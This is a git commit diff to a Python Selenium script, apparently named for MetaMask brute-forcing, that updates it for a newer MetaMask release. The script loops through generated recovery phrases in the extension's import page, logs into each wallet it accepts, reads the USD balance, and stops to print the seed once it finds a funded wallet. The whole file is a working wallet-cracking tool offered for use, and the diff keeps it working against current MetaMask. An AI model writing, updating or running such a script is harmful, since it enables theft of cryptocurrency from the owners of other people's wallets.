b99215800bbd2ed4f7a64b760cb48ffe600f0e0d
0x00032 <53447243+0x00032@users.noreply.github.com>
2024-12-02 17:24:03 -0500

    Updated to current metamask release.

--- MM-BF.py
+++ MM-BF.py
@@ -1,6 +1,7 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
+from selenium.common.exceptions import NoSuchElementException
 import time
 import subprocess
 import pyperclip as pc
@@ -8,23 +9,22 @@ import random
 
 
 # the path of .crx file
-EXTENSION_PATH = "  your browser path     /Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/10.21.1_0.crx"
+EXTENSION_PATH = "./extention.crx"
 metaMask_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
 
 opt = webdriver.ChromeOptions()
 opt.add_extension(EXTENSION_PATH)  # add the extension
 driver = webdriver.Chrome(options=opt)  # open chrome with metamask extension
 
+# then  seed phrase pahe
+
+driver.get('chrome-extension://'+metaMask_id + '/home.html#onboarding/import-with-recovery-phrase')
+time.sleep(5)
+
 # switch tab
 driver.switch_to.window(driver.window_handles[0])
 
-# then  seed phrase pahe
-
-driver.get('chrome-extension://'+metaMask_id +
-           '/home.html#initialize/create-password/import-with-seed-phrase')
-time.sleep(1)
-driver.find_element(
-    by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]')  # select textbox
+driver.find_element(by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]')  # select textbox
 
 # Categorize the words
 
@@ -82,7 +82,7 @@ seedCounter = 0
 while seedCounter < 5000:
     seed = []
 
-    password = "12345678"
+    password = "12345678@@@"
     count = 1
 
     keys = [i for i in range(1, 13)]
@@ -114,13 +114,18 @@ while seedCounter < 5000:
 
         pc.copy(string)  # copy the string
 
-        driver.find_element(
-            by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]').send_keys(Keys.CONTROL + 'v')  # paste string
+        driver.find_element(by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]').send_keys(Keys.CONTROL + 'v')  # paste string
 
         # if invalid seed phrase:
         try:
             # check to see if invalid message pops up
-            driver.find_element(by=By.CSS_SELECTOR, value='#app-content > div > div.main-container-wrapper > div > div > div > form > div.import-srp__container > div.actionable-message.actionable-message--danger.import-srp__srp-error.actionable-message--with-icon')
+
+            try:
+                time.sleep(0.1)
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[4]/div/div/div[4]/span')
+            except:
+                time.sleep(0.1)
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/form/div[1]/div[4]/span')
 
             # get next words increment
             print('Attempts', count, end='\r', flush=False)
@@ -131,58 +136,70 @@ while seedCounter < 5000:
         # if valid seed phrase:
         except:
             # enter into wallet:
-            driver.find_element(
-                by=By.XPATH, value='//*[@id="password"]').send_keys(password)  # enter pass
-            driver.find_element(
-                by=By.XPATH, value='//*[@id="confirm-password"]').send_keys(password)  # confirm pass
-
-            try:  # after first login, check box
-                driver.find_element(
-                    by=By.XPATH, value='/html/body/div[1]/div/div[2]/div/div/div[2]/form/div[3]/input').click()  # click check box
+            try:
+                driver.find_element(By.CSS_SELECTOR, value='#app-content > div > div.mm-box.main-container-wrapper > div > div > div > div.import-srp__actions > div > button').click()
             except:
                 pass
 
-            try:  # After that - first login ->import btn -> restore btn
-                driver.find_element(
-                    by=By.CSS_SELECTOR, value='#app-content > div > div.main-container-wrapper > div > div > div.first-time-flow__import > form > button').click()  # click import
+            time.sleep(2)
 
+            try:
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/div[1]/label/input').send_keys(password)  # enter pass
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/div[2]/label/input').send_keys(password)  # confirm pass
             except:
-                driver.find_element(
-                    by=By.XPATH, value='//*[@id="app-content"]/div/div[3]/div/div/div/form/button').click()  # click restore
+                driver.find_element(by=By.XPATH, value='//*[@id="password"]').send_keys(password)  # enter pass
+                driver.find_element(by=By.XPATH, value='//*[@id="confirm-password"]').send_keys(password)  # confirm pass
+
+
+            try:  # after first login, check box
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/div[3]/label/span[1]/input').click()  # click check box
+            except:
+                pass
+            
+            try:  # After that - first login ->import btn -> restore btn
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/button').click()  # click import
+            except:
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/form/button').click()  # click restore
 
             # we need to wait for the  the page to load!!
             time.sleep(2)
 
-            try:  # after first login, click all done disapears
-                driver.find_element(
-                    by=By.CSS_SELECTOR, value='#app-content > div > div.main-container-wrapper > div > div > button').click()  # click all done
+            try:
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/button[1]').click()  # click remind me later
+                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[1]/div/div/label/input').click()  # click check box
+                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[2]/div/button[2]').click()  # click skip button
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[3]/button').click()  # click done button
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/button').click()  # click next button
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/button').click()  # click done button
+                time.sleep(1)
+                driver.find_element(by=By.CSS_SELECTOR, value='#popover-content > div > div > section > div.box.popover-scroll-button.box--display-flex.box--flex-direction-row.box--justify-content-center.box--align-items-center.box--color-icon-default.box--background-color-background-default.box--border-color-border-default.box--border-style-solid.box--border-width-1').click()
+                time.sleep(3)
+                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[2]/div/div/div/label/span[1]').click()  # check terms of service
+                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[3]/button').click()  # click accept button
             except:
+                time.sleep(4.5)
                 pass
-
+            
             # once we in wallet
-            elem = driver.find_element(
-                by=By.XPATH, value='/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[1]/div/div/div/div[2]/span[2]')  # find balance element
-            usd = float(elem.text[1:])  # get the balance in usd
+            elem = driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[3]/div/div/div/div[1]/div/div[1]/div/div/div/div[1]/div/span[1]')  # find balance element
+            usd = float(elem.text[1:].replace("$", ""))  # get the balance in usd
             if usd == 0:
                 seed = []  # reset seed
                 looper = True  # continue loop
                 print(count, 'the account is empty:', string)
                 count += 1
 
-                try:  # after first login, popup disapears
-                    driver.find_element(
-                        by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[1]/div/button').click()  # exit pop-up
-                except:
-                    pass
+                time.sleep(1)
+
                 # click on profile
-                driver.find_element(
-                    by=By.XPATH, value='/html/body/div[1]/div/div[1]/div/div[2]/button').click()
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div[3]/div/div/button').click()
+
                 # click 'lock' account
-                driver.find_element(
-                    by=By.XPATH, value='/html/body/div[1]/div/div[3]/div[2]/button').click()
-                time.sleep(0.01)
-                driver.get('chrome-extension://'+metaMask_id +
-                           '/home.html#restore-vault')
+                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div[3]/div[2]/button[8]').click()
+
+                time.sleep(0.02)
+
+                driver.get('chrome-extension://' + metaMask_id + '/home.html#restore-vault')
             else:
                 looper = False  # terminate the loop
                 # print the seed and balance
